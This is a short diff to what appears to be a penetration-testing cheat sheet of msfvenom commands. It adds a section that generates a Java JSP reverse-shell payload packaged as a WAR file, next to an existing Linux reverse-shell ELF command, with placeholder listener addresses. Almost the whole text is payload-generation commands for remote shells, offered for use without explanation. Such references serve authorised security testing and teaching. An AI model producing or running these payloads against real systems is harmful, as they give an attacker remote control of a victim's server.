@@ -16,6 +16,12 @@ msfvenom  --list encoders
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
 ```
 
+### Java Code
+
+``` bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+```
+
 ### Shell Code
 
 ``` bash
